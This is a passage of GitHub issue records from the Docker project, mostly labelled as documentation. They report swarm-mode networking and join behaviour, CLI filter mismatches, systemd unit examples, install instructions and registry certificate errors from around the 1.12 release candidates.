repositories\n\n```\nosboxes@worker3:~$ docker version\nClient:\n Version:      1.12.0-rc2\n API version:  1.24\n Go version:   go1.6.2\n Git commit:   906eacd-unsupported\n Built:        Fri Jun 17 21:12:28 2016\n OS/Arch:      linux/amd64\n Experimental: true\n\nServer:\n Version:      1.12.0-rc2\n API version:  1.24\n Go version:   go1.6.2\n Git commit:   906eacd-unsupported\n Built:        Fri Jun 17 21:12:28 2016\n OS/Arch:      linux/amd64\n Experimental: true\n```\n\n**Output of `docker info`:**\n\n```\nosboxes@worker3:~$ docker info\nContainers: 12\n Running: 2\n Paused: 0\n Stopped: 10\nImages: 11\nServer Version: 1.12.0-rc2\nStorage Driver: aufs\n Root Dir: /var/lib/docker/aufs\n Backing Filesystem: extfs\n Dirs: 66\n Dirperm1 Supported: true\nLogging Driver: json-file\nCgroup Driver: cgroupfs\nPlugins:\n Volume: local\n Network: overlay host null bridge\nSwarm: active\n NodeID: aat8ei7yd02du6f7qh47aykk5\n IsManager: No\nRuntimes: default\nDefault Runtime: default\nSecurity Options: apparmor seccomp\nKernel Version: 4.4.0-28-generic\nOperating System: Ubuntu 16.04 LTS\nOSType: linux\nArchitecture: x86_64\nCPUs: 2\nTotal Memory: 2.751 GiB\nName: worker3\nID: 3PJ2:Q4UW:FPJI:URH4:7J2N:ZBTJ:3G54:YOF6:UP35:AIGW:QS7F:HZOJ\nDocker Root Dir: /var/lib/docker\nDebug Mode (client): false\nDebug Mode (server): false\nRegistry: https://index.docker.io/v1/\nWARNING: No swap limit support\nExperimental: true\nInsecure Registries:\n 127.0.0.0/8\nosboxes@worker3:~$ docker version\n```\n\n**Additional environment details (AWS, VirtualBox, physical, etc.):**\nVMware fusion VM's. tested with 2 and 3 separate VM's in a swarm\n\n**Steps to reproduce the issue:**\n1. docker swarm init; #other host;  docker swarm join ip:2377\n2. Create overlay network:\n`docker network create -d overlay my-test-network`\n3. Deploy docker containers to test. I did a quick and dirty deploy of base ubuntu images, and installed tools within them. \n`docker service create --network my-test-network --replicas 3 --name networktest ubuntu:latest sleep 36000`\n4. docker inspect ContainerID to get IP addresses of containers on network\n5. Run tcpdump on docker node (i.e. ubuntu VM) or hypervisor (i.e. mac desktop) to watch traffic on port 4789\n`sudo tcpdump -s 1500 -A -i ens37 port 4789`\n6. Observe that traffic is in cleartext (i.e. install nginx on one container in the service, then install curl on another, and grab the default page. \n\n**Describe the results you received:**\nTraffic when inspected via tcpdump is in cleartext (i.e. http traffic is clearly visible)\n\n**Describe the results you expected:**\nExpected to see encapsulated traffic. Not sure if this is expected and I'm not testing this correctly, or what. I.e. do I need two physically separate hosts, mirror a switch port, and watch traffic there, and/or is bridge mode networking within the mac/vmware fusion confusing things?\n\n**Additional information you deem important (e.g. issue happens only occasionally):**\n"},{"labels":["documentation"],"text":"On the [Getting started with swarm mode](https://docs.docker.com/engine/swarm/swarm-tutorial/#/the-ip-address-of-the-manager-machine) page, we just need to remove `Tip: Docker recommends that every node in the cluster be on the same layer 3 (IP) subnet with all traffic permitted between nodes.` towards the bottom of the page since there is no broadcast domain constraint. Ping @thaJeztah \n\nThanks!\n"},{"labels":["documentation"],"text":"cfr.: https://github.com/docker/docker/issues/24076#issuecomment-229734136\n\n@sfsmithcha @tiborvass \n"},{"labels":["documentation",null,null],"text":"**Output of `docker version`:**\n\n```\nClient:\n Version:      1.12.0-rc2\n API version:  1.24\n Go version:   go1.6.2\n Git commit:   906eacd\n Built:        Fri Jun 17 20:35:33 2016\n OS/Arch:      linux/amd64\n Experimental: true\n\nServer:\n Version:      1.12.0-rc2\n API version:  1.24\n Go version:   go1.6.2\n Git commit:   906eacd\n Built:        Fri Jun 17 20:35:33 2016\n OS/Arch:      linux/amd64\n Experimental: true\n```\n\n**Output of `docker info`:**\n\n```\nContainers: 8\n Running: 8\n Paused: 0\n Stopped: 0\nImages: 228\nServer Version: 1.12.0-rc2\nStorage Driver: aufs\n Root Dir: /var/lib/docker/aufs\n Backing Filesystem: extfs\n Dirs: 761\n Dirperm1 Supported: true\nLogging Driver: json-file\nCgroup Driver: cgroupfs\nPlugins:\n Volume: local\n Network: bridge null overlay host\nSwarm: active\n NodeID: bzk4vv65idjvtxi09gdqtfwbd\n IsManager: Yes\n Managers: 1\n Nodes: 1\n CACertHash: sha256:c0fdf51a4eaa403e7119c77001349cf6bc025542e166179a7ae3ba50f5b422f9\nRuntimes: default\nDefault Runtime: default\nSecurity Options: apparmor seccomp\nKernel Version: 3.16.0-73-generic\nOperating System: Ubuntu 14.04.4 LTS\nOSType: linux\nArchitecture: x86_64\nCPUs: 8\nTotal Memory: 31.06 GiB\nName: j-think\nID: OCMX:LCWD:ZLEO:SGYW:ZWUQ:YLI3:TPPY:4ZLH:GBXC:PKJ2:FNNF:TOOL\nDocker Root Dir: /var/lib/docker\nDebug Mode (client): false\nDebug Mode (server): false\nUsername: johnharris85\nRegistry: https://index.docker.io/v1/\nWARNING: No swap limit support\nExperimental: true\nInsecure Registries:\n 127.0.0.0/8\n```\n\n**Steps to reproduce the issue:**\n1. `docker swarm init`\n2. `docker swarm inspect`\n\n**Describe the results you received:**\nI see only the worker marked to auto-accept into the swarm.\n\n**Describe the results you expected:**\nI expect to see both manager and work set to auto-accept into the swarm as per the documentation here: https://docs.docker.com/engine/reference/commandline/swarm_init/.\n\nWhat's the desired behaviour here? I'm happy to submit a PR for either the docs or the swarm defaults. Personally think the current behavior should stay and docs should be updated (seems like a sensible default).\n"},{"labels":["documentation"],"text":"It would be nice if the documentation contains best practices for operating swarm managers.\n\nFor example:\n- Are swarm managers like mesos masters which needs to be operated in odd numbers to maintain quorum?\n- What is the maximum number of managers you should have in a swarm? Are they like Zookeeper ensembles where as the number of members in the ensemble increases, the write performance decreases?\n- Is it advisable to make every node a manager, so that we can administrate the swarm from any node?\n- Can swarm be run in high availability mode? If so, is there an example?\n"},{"labels":[null,"documentation",null,null,null,null],"text":"Taken from the CLI reference page of `docker node tasks`:\n\n> The `name` filter matches on all or part of a task's name.\n\nThis is wrong. The filtering is applied on the **exact service name**, see example below.\n\nI think this is actually more useful than filtering on task names and therefore propose to **change the filter name from `name` to `service`**.\n\nFurthermore, filtering should be extended to also cover substring matches, not only exact matches.\n\n``` bash\n$ docker service create --name top busybox top\n7ieif28g1smw7ppav7wiausmz\n\n# a task with name top.1 was created on this node\n$ docker node tasks self\nID                         NAME   SERVICE  IMAGE    LAST STATE          DESIRED STATE  NODE\nbrscnd76m5eh8l3cvmpt5lkj4  top.1  top      busybox  Running 51 seconds  Running        bd4242800842\n\n# filtering by part of the task's name does not find the task\n$ docker node tasks --filter name=to self\nID  NAME  SERVICE  IMAGE  LAST STATE  DESIRED STATE  NODE\n\n# filtering by the task's exact name does not find the task\n$ docker node tasks --filter name=top.1 self\nID  NAME  SERVICE  IMAGE  LAST STATE  DESIRED STATE  NODE\n\n# ==> only filtering by the SERVICE's name finds the task <==\n$ docker node tasks --filter name=top self\nID                         NAME   SERVICE  IMAGE    LAST STATE              DESIRED STATE  NODE\nbrscnd76m5eh8l3cvmpt5lkj4  top.1  top      busybox  Running About a minute  Running        bd4242800842\n\n$ docker version\nClient:\n Version:      1.12.0-dev\n API version:  1.25\n Go version:   go1.6.2\n Git commit:   83e6197-unsupported\n Built:        Tue Jun 28 20:00:19 2016\n OS/Arch:      linux/amd64\n\nServer:\n Version:      1.12.0-dev\n API version:  1.25\n Go version:   go1.6.2\n Git commit:   83e6197-unsupported\n Built:        Tue Jun 28 20:00:19 2016\n OS/Arch:      linux/amd64\n```\n"},{"labels":["documentation",null,null],"text":"**Output of `docker version`:**\nroot@xxxxx:~# docker version\nClient:\n Version:      1.12.0-rc2\n API version:  1.24\n Go version:   go1.6.2\n Git commit:   906eacd\n Built:        Fri Jun 17 21:09:07 2016\n OS/Arch:      linux/amd64\n\nServer:\n Version:      1.12.0-rc2\n API version:  1.24\n Go version:   go1.6.2\n Git commit:   906eacd\n Built:        Fri Jun 17 21:09:07 2016\n OS/Arch:      linux/amd64\n\nroot@xxxxx:~# docker-compose version\ndocker-compose version 1.8.0-rc1, build 9bf6bc6\ndocker-py version: 1.8.1\nCPython version: 2.7.9\nOpenSSL version: OpenSSL 1.0.1e 11 Feb 2013\n\n**Output of `docker info`:**\nContainers: 49\n Running: 0\n Paused: 0\n Stopped: 49\nImages: 109\nServer Version: 1.12.0-rc2\nStorage Driver: aufs\n Root Dir: /var/lib/docker/aufs\n Backing Filesystem: extfs\n Dirs: 246\n Dirperm1 Supported: true\nLogging Driver: json-file\nCgroup Driver: cgroupfs\nPlugins:\n Volume: local\n Network: bridge overlay null host\nSwarm: active\n NodeID: 34lgngb2j2iufvk046th0p6qq\n IsManager: Yes\n Managers: 1\n Nodes: 3\n CACertHash: sha256:4dd1a761493f5ef3fcaa783113b85b935a7686cc954f5507af9b3743b87cd5b9\nRuntimes: default\nDefault Runtime: default\nSecurity Options: apparmor seccomp\nKernel Version: 3.16.0-30-generic\nOperating System: Ubuntu 14.04.2 LTS\nOSType: linux\nArchitecture: x86_64\nCPUs: 2\nTotal Memory: 1.955 GiB\nName: pek2-gosv-16-dhcp226\nID: 2B4M:L4M2:6Q3A:HLAU:3CNJ:JA7I:34T3:NRBA:BGY6:RY5A:4AS3:AC6L\nDocker Root Dir: /var/lib/docker\nDebug Mode (client): false\nDebug Mode (server): false\nHttp Proxy: xxxx.some.com:1234\nHttps Proxy: xxxx.some.com:1234\nRegistry: https://index.docker.io/v1/\nWARNING: No swap limit support\nInsecure Registries:\n 127.0.0.0/8\n\n**Additional environment details (AWS, VirtualBox, physical, etc.):**\n\n**Steps to reproduce the issue:**\n0. Prepare three ubuntu14.04 machines, here I used VMware VMs\n1. Upgrade docker engine to v1.12rc2\n2. (Optional)Upgrade docker compose 1.8.0-rc1 (I could also reproduce this issue on earlier version such as  v1.6.1GA)\n3. create a swarm cluster with 1 manger node and 2 slave nodes,  as documented in v1.12 swarm-mode doc. Here in my network setup, \"ingress\" is swarm created overlay network\npengzhencao@pek2-gosv-16-dhcp226:~/docker/docker$ docker node list\nID                           NAME                  MEMBERSHIP  STATUS  AVAILABILITY  MANAGER STATUS\n34lgngb2j2iufvk046th0p6qq \\*  pek2-gosv-16-dhcp226  Accepted    Ready   Active        Leader\n37fmlm52xw0iy7k6zoo5j09px    pek2-gosv-16-dhcp160  Accepted    Ready   Active\n61lw7iskl9ivnxaveby8dfaf1    pek2-gosv-16-dhcp45   Accepted    Ready   Active\npengzhencao@pek2-gosv-16-dhcp226:~/docker/docker$ docker network list\nNETWORK ID          NAME                DRIVER              SCOPE\n8b94d08c0f67        bridge              bridge              local\n74b71c054864        deploy_default      bridge              local\nabd08b2c6c5d        docker_gwbridge     bridge              local\n651d9df026eb        host                host                local\n7oywymoz6bbp        ingress             overlay             swarm\n18e3039be16b        none                null                local\n1. On the swarm manager node, edit docker-compose.yml file with the following settings:\n   version: '2'\n   services:\n   log:\n     build: ./log/\n     volumes:\n       - /var/log/harbor/:/var/log/docker/\n     ports:\n       - 1514:514\n   ....(some other services)\n   networks:\n   default:\n     external:\n       name: ingress\n2. run with \"docker-compose up\"\n\n**Describe the results you received:**\npengzhencao@pek2-gosv-16-dhcp226:~/harbor/Deploy$ docker-compose up\nRecreating deploy_log_1\nERROR: for log  swarm-scoped network (ingress) is not compatible with `docker create` or `docker run`. This network can be only used docker service\nERROR: Encountered errors while bringing up the project.\n**Describe the results you expected:**\nDocker compose should deploy the services up with overlay network \"ingress\"\n\n**Additional information you deem important (e.g. issue happens only occasionally):**\nI've followed swarm and docker-compose integration guide here:\nhttps://docs.docker.com/compose/networking/\n\nThe above error seems to be thrown in L356:\nin  docker/daemon/container_operations.go\n330 func errClusterNetworkOnRun(n string) error {\n331         return fmt.Errorf(\"swarm-scoped network (%s) is not compatible with `docker create` or `docker run`. This network can be only used     docker service\", n)\n332 }\n333\n334 // updateContainerNetworkSettings update the network settings\n335 func (daemon _Daemon) updateContainerNetworkSettings(container *container.Container, endpointsConfig map[string]_networktypes.EndpointSetti    ngs) error {\n336         var (\n337                 n   libnetwork.Network\n338                 err error\n339         )\n340\n341         mode := container.HostConfig.NetworkMode\n342         if container.Config.NetworkDisabled || mode.IsContainer() {\n343                 return nil\n344         }\n345\n346         networkName := mode.NetworkName()\n347         if mode.IsDefault() {\n348                 networkName = daemon.netController.Config().Daemon.DefaultNetwork\n349         }\n350         if mode.IsUserDefined() {\n351                 n, err = daemon.FindNetwork(networkName)\n352                 if err != nil {\n353                         return err\n354                 }\n355                 if !container.Managed && n.Info().Dynamic() {\n356                         return errClusterNetworkOnRun(networkName)\n357                 }\n358                 networkName = n.Name()\n359         }\n360 \n"},{"labels":["documentation"],"text":"The use of constraints should be documented in the reference. While https://github.com/docker/docker/blob/master/docs/reference/commandline/service_create.md says that the `--constraint` flag exists when creating a service, it is unclear how this is to be used and whether the same usage as docker/swarm applies.\n\nIt would also be nice to have a few examples showing how this is to be used.\n"},{"labels":[null,"documentation",null,null],"text":"`docker service scale`... Why is the _the only_ parameter which can be updated through both a first-class command _and_ through `docker service update`?  Isn't that a bit inconsistent?\n\nI know that it was this way in Docker Compose, but is including Docker Compose vestiges in the new `docker swarm` _really_ a good idea?  Will this inclusion of a Docker Compose vestige set a user expectation for `docker swarm` to imitate Compose closely in other ways as well?\n\nHere's our last chance to pull it, before it becomes canon and removing it breaks hundreds of shell scripts.  Feel free to close if I'm way off mark here.\n\n@aluzzardi @vieux @dnephin @abronan \n"},{"labels":["documentation",null],"text":"According to the engine-api Docs, resource settings are \"NanoCPUs\" and \"MemoryBytes\" - https://godoc.org/github.com/docker/engine-api/types/swarm#Resources\n\nThe corresponding docs for the remote API show simply \"CPU\" and \"Memory\" https://github.com/docker/docker/blob/master/docs/reference/api/docker_remote_api_v1.24.md#create-a-service\n"},{"labels":[null,"documentation"],"text":"On `Docker version 1.11.2, build b9f10c9`, both `POST /v1.23/containers/<container ID>/exec` and `POST /v1.23/exec/<exec ID>/start` have the following body:\n\n``` json\n{\n  \"AttachStderr\": true,\n  \"AttachStdin\": true,\n  \"AttachStdout\": true,\n  \"Cmd\": [\n    \"true\"\n  ],\n  \"Container\": \"<container ID>\",\n  \"Detach\": false,\n  \"DetachKeys\": \"\",\n  \"Privileged\": false,\n  \"Tty\": true,\n  \"User\": \"\"\n}\n```\n\nOn `Docker version 1.12.0-rc2, build 906eacd, experimental`, both `POST /v1.24/containers/<container ID>/exec` and `POST /v1.24/exec/<exec ID>/start` have the following body:\n\n``` json\n{\n  \"AttachStderr\": true,\n  \"AttachStdin\": true,\n  \"AttachStdout\": true,\n  \"Cmd\": [\n    \"true\"\n  ],\n  \"Detach\": false,\n  \"DetachKeys\": \"\",\n  \"Privileged\": false,\n  \"Tty\": true,\n  \"User\": \"\"\n}\n```\n\nNote that the bodies are different -- the v1.23 body includes the container ID. This change doesn't appear in the Remote API documentation.\n"},{"labels":["documentation"],"text":"#23790 added support for this as an environment variable `DOCKER_SERVICE_PREFER_OFFLINE_IMAGE` to support our integration tests.\n\nWe should figure out if we want to:\n- document this\n- make it configurable in some other way\n- use digest or image IDs to avoid pulling if local image is present.\n\nI'd prefer not to rush this for 1.12 timeframe.\n\n@vdemeester \n"},{"labels":["documentation",null],"text":"When rendering a left nav where selections in that area render pages in the main content area, it's important to have a clear indication in the left nav where the user is.  That is, where the content for the main content area came from.\n\nI imagine I could find many examples of this, but I'm currently looking at [Docker networks feature overview](https://docs.docker.com/engine/userguide/networking/).  I would provide a screenshot, but imagebin isn't working for me right now.\n\nWhat I see on the screen indicates that I might be somewhere in the \"User Guide\" section, and I imagine that I know this page is talking about networking, so I might be somewhere around the \"Network configuration\" section, but the rendering of the left nav isn't helping me here.\n"},{"labels":["documentation",null],"text":"On the documentation page [_Automatically start containers_](https://docs.docker.com/engine/admin/host_integration/) the example for a [systemd](https://freedesktop.org/wiki/Software/systemd/) [service unit](https://docs.docker.com/engine/admin/host_integration/#systemd) with `docker run` is given as below.\n\n```\n[Service]\n…\nExecStart=/usr/bin/docker run --env foo=bar --name redis_server redis\nExecStop=/usr/bin/docker stop -t 2 redis_server ; /usr/bin/docker rm -f redis_server\n…\n```\n\nThis should be changed to the example below, using `ExecStopPost`.\n\n```\n[Service]\n…\nExecStart=/usr/bin/docker run --env foo=bar --name redis_server redis\nExecStop=/usr/bin/docker stop -t 2 redis_server\nExecStopPost=/usr/bin/docker rm -f redis_server\n…\n```\n\nFrom the [manual](https://www.freedesktop.org/software/systemd/man/systemd.service.html):\n\n> `ExecStop=`\n> \n> It is recommended to use this setting for commands that communicate with the service requesting clean termination. When the commands specified with this option are executed it should be assumed that the service is still fully up and is able to react correctly to all commands. For post-mortem clean-up steps use ExecStopPost= instead.\n> \n> `ExecStopPost=`\n> \n> Additional commands that are executed after the service is stopped. This includes cases where the commands configured in ExecStop= were used, where the service does not have any ExecStop= defined, or where the service exited unexpectedly. This argument takes multiple command lines, following the same scheme as described for ExecStart=. Use of these settings is optional. Specifier and environment variable substitution is supported. Note that – unlike ExecStop= – commands specified with this setting are invoked when a service failed to start up correctly and is shut down again.\n> \n> It is recommended to use this setting for clean-up operations that shall be executed even when the service failed to start up correctly. Commands configured with this setting need to be able to operate even if the service failed starting up half-way and left incompletely initialized data around. As the service's processes have been terminated already when the commands specified with this setting are executed they should not attempt to communicate with them.\n\nSo to ensure, that the Docker container is really deleted, and the service will start up again, after an unclean shutdown, that means the Docker container is stopped, but is still around, the Docker container deletion command should be in the directive `ExecStopPost=`.\n"},{"labels":["documentation",null],"text":"Feedback on Debian install from John Clements clements@brinckerhoff.org\n\nOn the Debian install page,\n\nhttps://docs.docker.com/engine/installation/linux/debian/\n\nStep 3 of the “update your apt” section reads:\n\n $ apt-get purge lxc-docker*\n $ apt-get purge docker.io*\n\nUnfortunately, on some shells, the globber will get ahold of the asterisk and try to find files in the local directory starting with lxc-docker, which isn’t what you want at all. Instead, this should probably read:\n\n $ apt-get purge \"lxc-docker_\"\n $ apt-get purge “docker.io_”\n\nThen, later, you suggest obtaining the signing key for the project with\n\n $ apt-key adv --keyserver hkp://p80.pool.sks-keyservers.net:80 --recv-keys 58118 E89F3A912897C070ADBF76221572C52609D\n\nThis timed out for me repeatedly, but I tried\n\n $ apt-key adv --keyserver hkp://pool.sks-keyservers.net:80 --recv-keys 58118 E89F3A912897C070ADBF76221572C52609D\n\n… and that worked fine. Dunno if this is a transient failure, but I’m guessing the more general address is probably more robust.\n\nFinally, and this is minor, you might want to replace the calls to `service` with calls to `systemctl`.\n\nThanks!\n\nJohn Clements\n"},{"labels":["documentation"],"text":"On your blog, you said the file extension .dab. but in the github repo, your file extension .dsb\n\nwhat's different with two file extension?\n\nhttps://blog.docker.com/2016/06/docker-app-bundle/\n\n![selection_034](https://cloud.githubusercontent.com/assets/278153/16214910/a5a46042-378f-11e6-99f8-4d1ed45ba41d.png)\n\nhttps://github.com/docker/docker/blob/master/experimental/docker-stacks-and-bundles.md\n![selection_035](https://cloud.githubusercontent.com/assets/278153/16214913/bb3ce226-378f-11e6-9fe5-72dfebe093ed.png)\n"},{"labels":[null,"documentation",null,null,null],"text":"**Output of `docker version`:**\n\nClient (laptop, OSX)\n\n```\n$> docker version\nClient:\n Version:      1.12.0-rc2\n API version:  1.24\n Go version:   go1.6.2\n Git commit:   906eacd\n Built:        Fri Jun 17 20:35:33 2016\n OS/Arch:      darwin/amd64\n Experimental: true\n\nServer:\n Version:      1.12.0-rc2\n API version:  1.24\n Go version:   go1.6.2\n Git commit:   a7119de\n Built:        Fri Jun 17 22:09:20 2016\n OS/Arch:      linux/amd64\n Experimental: true\n```\n\nServer:\n\n```\nClient:\n Version:      1.12.0-rc2\n API version:  1.24\n Go version:   go1.6.2\n Git commit:   906eacd-unsupported\n Built:        Fri Jun 17 21:21:56 2016\n OS/Arch:      linux/amd64\n\nServer:\n Version:      1.12.0-rc2\n API version:  1.24\n Go version:   go1.6.2\n Git commit:   906eacd-unsupported\n Built:        Fri Jun 17 21:21:56 2016\n OS/Arch:      linux/amd64\n```\n\n**Output of `docker info`:**\n\nClient:\n\n```\nContainers: 78\n Running: 0\n Paused: 0\n Stopped: 78\nImages: 51\nServer Version: 1.12.0-rc2\nStorage Driver: aufs\n Root Dir: /var/lib/docker/aufs\n Backing Filesystem: extfs\n Dirs: 344\n Dirperm1 Supported: true\nLogging Driver: json-file\nCgroup Driver: cgroupfs\nPlugins:\n Volume: local\n Network: overlay bridge null host\nSwarm: inactive\nRuntimes: default\nDefault Runtime: default\nSecurity Options: seccomp\nKernel Version: 4.4.13-moby\nOperating System: Alpine Linux v3.4\nOSType: linux\nArchitecture: x86_64\nCPUs: 4\nTotal Memory: 1.954 GiB\nName: moby\nID: AX3N:B5KC:6TY6:V5UW:5MAH:JSD3:PXBN:HC3H:GF3L:GC7L:Z35R:KAIW\nDocker Root Dir: /var/lib/docker\nDebug Mode (client): false\nDebug Mode (server): true\n File Descriptors: 33\n Goroutines: 95\n System Time: 2016-06-20T22:09:37.819574454Z\n EventsListeners: 1\nNo Proxy: *.local, 169.254/16\nRegistry: https://index.docker.io/v1/\nExperimental: true\nInsecure Registries:\n 127.0.0.0/8\n```\n\nServer (swarm cluster):\n\n```\nContainers: 0\n Running: 0\n Paused: 0\n Stopped: 0\nImages: 0\nServer Version: 1.12.0-rc2\nStorage Driver: aufs\n Root Dir: /var/lib/docker/aufs\n Backing Filesystem: extfs\n Dirs: 0\n Dirperm1 Supported: true\nLogging Driver: json-file\nCgroup Driver: cgroupfs\nPlugins:\n Volume: local\n Network: overlay host null bridge\nSwarm: inactive\nRuntimes: default\nDefault Runtime: default\nSecurity Options: apparmor seccomp\nKernel Version: 4.4.0-24-generic\nOperating System: Ubuntu 16.04 LTS\nOSType: linux\nArchitecture: x86_64\nCPUs: 1\nTotal Memory: 991.1 MiB\nName: docker1\nID: LOR7:TUJW:PXCF:SGKX:L5LU:GQCT:UTRN:G72M:JU32:I24J:JN3R:BN34\nDocker Root Dir: /var/lib/docker\nDebug Mode (client): false\nDebug Mode (server): false\nRegistry: https://index.docker.io/v1/\nInsecure Registries:\n 127.0.0.0/8\n```\n\n**Additional environment details (AWS, VirtualBox, physical, etc.):**\n\n**Steps to reproduce the issue:**\n1. Set up a remote swarm cluster - mine is 4 remote nodes, 2 leaders\n2. On your laptop, run:\n\n```\n$> docker swarm join swarmIP:2377\nThis node joined a Swarm as a worker.\n```\n1. On the leader:\n\n```\ndocker node ls\nID                         NAME     MEMBERSHIP  STATUS  AVAILABILITY  MANAGER STATUS\n09y7cdu03xmuwhta0ykvd72gb  docker4  Accepted    Ready   Active        Reachable\n1jkzrkblwbdig3l5u29997n00  docker1  Accepted    Ready   Active        Leader\n41znz1ntskwvvvea8up52wu0m  docker2  Accepted    Ready   Active        \n5bt1bcak4tuzm9a39a7ou9upz  docker3  Accepted    Ready   Active        \n7ljlfo1zqcid0mc8cmir64i6g  moby     Accepted    Ready   Active \n```\n\n**Describe the results you received:**\n\nMy 'rogue' laptop was able to join the swarm cluster as a worker and shows up in the manager list as ready and active.\n\n**Describe the results you expected:**\n\nI expected the join command to require approval from a manager node as it does in manager mode\n\n**Additional information you deem important (e.g. issue happens only occasionally):**\n"},{"labels":["documentation"],"text":"Per @thaJeztah , verify correct version of api docs post-1.12 release. Ref https://github.com/docker/docker/pull/23777 .\n"},{"labels":["documentation"],"text":"Review consistency of CLI reference with the code on the new commands:\n- `docker node`\n- `docker service`\n- `docker swarm`\n"},{"labels":["documentation"],"text":"Review consistency of API reference with the code on the new endpoints:\n- Node endpoints\n- Service endpoints\n- Swarm endpoints\n"},{"labels":[null,"documentation",null],"text":"**Output of `docker version`:**\n\n```\nClient:\n Version:      1.11.2\n API version:  1.23\n Go version:   go1.5.4\n Git commit:   b9f10c9\n Built:        Wed Jun  1 22:00:43 2016\n OS/Arch:      linux/amd64\n\nServer:\n Version:      1.11.2\n API version:  1.23\n Go version:   go1.5.4\n Git commit:   b9f10c9\n Built:        Wed Jun  1 22:00:43 2016\n OS/Arch:      linux/amd64\n\n```\n\n**Output of `docker info`:**\n\n```\nContainers: 4\n Running: 0\n Paused: 0\n Stopped: 4\nImages: 4\nServer Version: 1.11.2\nStorage Driver: aufs\n Root Dir: /var/lib/docker/aufs\n Backing Filesystem: extfs\n Dirs: 15\n Dirperm1 Supported: true\nLogging Driver: json-file\nCgroup Driver: cgroupfs\nPlugins: \n Volume: local\n Network: bridge null host\nKernel Version: 4.4.0-22-generic\nOperating System: Ubuntu 16.04 LTS\nOSType: linux\nArchitecture: x86_64\nCPUs: 4\nTotal Memory: 7.676 GiB\nName: maxnoe-mac\nID: AJ2Z:G6U4:LKAZ:PXNC:PBBJ:7B73:BM6B:NYTX:JZAS:XW6H:VAV2:7XDM\nDocker Root Dir: /var/lib/docker\nDebug mode (client): false\nDebug mode (server): false\nRegistry: https://index.docker.io/v1/\nWARNING: No swap limit suppor\n```\n\n**Steps to reproduce the issue:**\n1. Try logging in to a registry with self signed certificates\n\n```\ndocker login myregstry.example.com:5000\n```\n\nThis worked with docker `1.9` on my machine because I have `--insecure-registry myregistry.example.com:5000` added to the `DOCKER_OPTS` in `/etc/defaults/docker`.\nAlso I registered the certificate system wide. `curl` works without providing the certificate explicitly\n\n**Describe the results you received:**\n`Error response from daemon: Get https://registry.e5.physik.tu-dortmund.de:5000/v1/users/: x509: certificate signed by unknown authority`\n\nOr, when also added to `/etc/docker/certs.d/<url>/ca.crt`:\n`Error response from daemon: Get https://registry.e5.physik.tu-dortmund.de:5000/v1/users/: x509: certificate signed by unknown authority (possibly because of \"x509: invalid signature: parent certificate cannot sign this kind of certificate\" while trying to verify candidate authority certificate \"registry.e5.physik.tu-dortmund.de\")`\n\n**Describe the results you expected:**\nSuccesfull login\n\n**Additional information you deem important (e.g. issue happens only occasionally):**\nThe registry is running as a rancher service behind a loadbalancer.\n"},{"labels":["documentation",null,null],"text":"> Mount volume (-v, --read-only)\n> \n> `$ docker  run  -v `pwd`:`pwd` -w `pwd` -i -t  ubuntu pwd`\n> \n> The -v flag mounts the current working directory into the container. The -w lets the command being executed inside the current working directory, by changing into the directory to the value returned by pwd. So this combination executes the command using the container, but inside the current working directory.\n\nSource: https://github.com/docker/docker/blob/master/docs/reference/commandline/run.md#mount-volume--v---read-only\n\nAreas for improvement: :smiley: \n- It assumes the user understands `pwd` command is evaluated to get the current working directory: Perhaps it's simpler to use `/current/directory` in the example instead? (Similar to the the `/doesnt/exist` used in the example just below this block.)\n- Explanation for `-w` switch is confusing. My understanding is that the `-w` refers to a working directory **insider** the container. So the example should explain that the command is executed in a directory inside the container that happens to have the same name as the current working directory. In additional, because of the bind volume, the directory inside the container is mapped to the current working directory on the host.\n"},{"labels":["documentation",null,null],"text":"The installation instructions currently use `$releasever` to configure the right YUM repository to use, however the instructions don't take into account the `Server` releases output the version in a different format (e.g. `7Server` instead of just `7`).\n\n```\n$ sudo tee /etc/yum.repos.d/docker.repo <<-'EOF'\n[dockerrepo]\nname=Docker Repository\nbaseurl=https://yum.dockerproject.org/repo/main/centos/$releasever/\nenabled=1\ngpgcheck=1\ngpgkey=https://yum.dockerproject.org/gpg\nEOF\n```\n\nThe installation script correctly strips the `Server` before generating the URL, so we should update the documentation to do the same, or show how to;\nhttps://github.com/docker/docker/blob/v1.11.2/hack/install.sh#L283-L285\n\nAs reported by Aleksandr Vinokurov on Twitter https://twitter.com/aleksandrvin/status/740548856316858368 (thanks!)\n\nAlso;\nhttps://access.redhat.com/discussions/2134691\n"},{"labels":["documentation",null],"text":"<!--\nIf you are reporting a new issue, make sure that we do not have any duplicates\nalready open. You can ensure this by searching the issue list for this\nrepository. If there is a duplicate, please close your issue and add a comment\nto the existing issue instead.\n\nIf you suspect your issue is a bug, please edit your issue description to\ninclude the BUG REPORT INFORMATION shown below. If you fail to provide this\ninformation within 7 days, we cannot debug your issue and will close it. We\nwill, however, reopen it if you later provide the information.\n\nFor more information about reporting issues, see\nhttps://github.com/docker/docker/blob/master/CONTRIBUTING.md#reporting-other-issues\n\n---------------------------------------------------\nBUG REPORT INFORMATION\n---------------------------------------------------\nUse the commands below to provide key information from your environment:\nYou do NOT have to include this information if this is a FEATURE REQUEST\n-->\n\n**Output of `docker version`:**\n\n```\nClient:\n Version:      1.11.2\n API version:  1.23\n Go version:   go1.5.4\n Git commit:   b9f10c9\n Built:        Wed Jun  1 22:00:43 2016\n OS/Arch:      linux/amd64\n\nServer:\n Version:      1.11.2\n API version:  1.23\n Go version:   go1.5.4\n Git commit:   b9f10c9\n Built:        Wed Jun  1 22:00:43 2016\n OS/Arch:      linux/amd64\n```\n\n**Output of `docker info`:**\n\n```\nContainers: 16\n Running: 13\n Paused: 0\n Stopped: 3\nImages: 270\nServer Version: 1.11.2\nStorage Driver: overlay\n Backing Filesystem: extfs\nLogging Driver: json-file\nCgroup Driver: cgroupfs\nPlugins: \n Volume: local\n Network: bridge null host\nKernel Version: 4.4.0-22-generic\nOperating System: Ubuntu 16.04 LTS\nOSType: linux\nArchitecture: x86_64\nCPUs: 8\nTotal Memory: 15.54 GiB\nName: bacigalubupc\nID: 4SXZ:24LJ:CLDS:NRQJ:BLRE:WMA3:BVVO:MOGC:DXNW:7COX:L5DX:F4Y6\nDocker Root Dir: /home/UX/lbacigalux/docker\nDebug mode (client): false\nDebug mode (server): true\n File Descriptors: 87\n Goroutines: 145\n System Time: 2016-06-02T16:25:00.463460097+02:00\n EventsListeners: 0\nUsername: lbacigal\nRegistry: https://index.docker.io/v1/\n\n```\n\n**Additional environment details (AWS, VirtualBox, physical, etc.):**\n\n**Steps to reproduce the issue:**\n1. `docker volume ls -f name=rose` or `docker volume ls -f driver=local`\n\n**Describe the results you received:**\nError response from daemon: Invalid 